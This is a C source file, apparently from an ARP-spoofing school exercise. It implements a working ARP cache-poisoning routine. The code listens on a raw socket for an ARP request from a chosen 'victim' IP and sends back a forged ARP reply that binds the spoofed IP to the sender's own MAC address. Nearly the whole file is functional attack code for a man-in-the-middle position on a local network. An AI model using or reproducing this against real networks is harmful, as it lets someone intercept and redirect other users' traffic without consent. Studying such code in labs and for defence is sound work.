#include "malcolm.h"

void prepare_arp_response(unsigned char *buffer, t_network_data *data) {

    // Ethernet-header
    t_ethernet_header *eth_header = (t_ethernet_header *)buffer;

    memcpy(eth_header->dest_mac, data->target_mac, ETH_ALEN);	// Destination MAC address
    memcpy(eth_header->src_mac, data->source_mac, ETH_ALEN);	// Source MAC address
    eth_header->ethertype = htons(ETH_P_ARP);					// Protocol type (e.g. 0x0806 for ARP)

    // ARP-header
    t_arp_header *arp_header = (t_arp_header *)(buffer + sizeof(t_ethernet_header));

    arp_header->htype = htons(1);          // Ethernet
    arp_header->ptype = htons(ETH_P_IP);   // IPv4
    arp_header->hlen = 6;                  // Len MAC
    arp_header->plen = 4;                  // Len IP-address
    arp_header->operation = htons(2);      // ARP Reply
    // My MAC and source IP as a sender
    memcpy(arp_header->sender_mac, data->source_mac, ETH_ALEN);
	memcpy(arp_header->sender_ip, data->source_ip, INET4_LEN);
    // MAC and IP of victim as a receiver
    memcpy(arp_header->target_mac, data->target_mac, ETH_ALEN);
    memcpy(arp_header->target_ip, data->target_ip, INET4_LEN);
}


void wait_for_arp_request(t_network_data *data) {
    int sockfd;
    struct sockaddr_ll sa;
    socklen_t sa_len = sizeof(sa);
    unsigned char buffer[BUFFER_SIZE];

    sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(1);
    }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, data->interface_name, IFNAMSIZ-1);
    if (ioctl(sockfd, SIOCGIFINDEX, &ifr) == -1) {
        perror("IOCTL failed");
        close(sockfd);
        exit(1);
    }

    memset(&sa, 0, sizeof(struct sockaddr_ll));
    sa.sll_family = AF_PACKET;
    sa.sll_protocol = htons(ETH_P_ARP);
    sa.sll_ifindex = ifr.ifr_ifindex;

    printf("Waiting for ARP request on interface: %s\n", data->interface_name);
	printf("------------------------------------------\n\n");

    while (1) {
        ssize_t len = recvfrom(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr *)&sa, &sa_len);
        if (len < 0) {
            perror("Recvfrom failed");
            close(sockfd);
            exit(1);
        }

        t_ethernet_header *eth_header = (t_ethernet_header *)buffer;
        t_arp_header *arp_header = (t_arp_header *)(buffer + sizeof(t_ethernet_header));

        // if ARP && ARP-request == 1
        if (ntohs(eth_header->ethertype) == ETH_P_ARP && ntohs(arp_header->operation) == 1) {

			// Check my victim ip - target_ip, and his target is - source_ip
			if (ft_memcmp(arp_header->sender_ip, data->target_ip, sizeof(struct in_addr)) == 0 &&
			ft_memcmp(arp_header->target_ip, data->source_ip, sizeof(struct in_addr)) == 0) {
				// ARP-reply preparation
				memset(buffer, 0, sizeof(buffer));
				prepare_arp_response(buffer, data);

				print_headers(buffer);

				// Sending ARP-response
				if (sendto(sockfd, buffer, sizeof(t_ethernet_header) + sizeof(t_arp_header), 0, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
				    perror("Sendto failed");
				    close(sockfd);
				    exit(1);
				}

				printf("ARP Reply sent\n");
				break;
			}
        }
    }

    close(sockfd);
}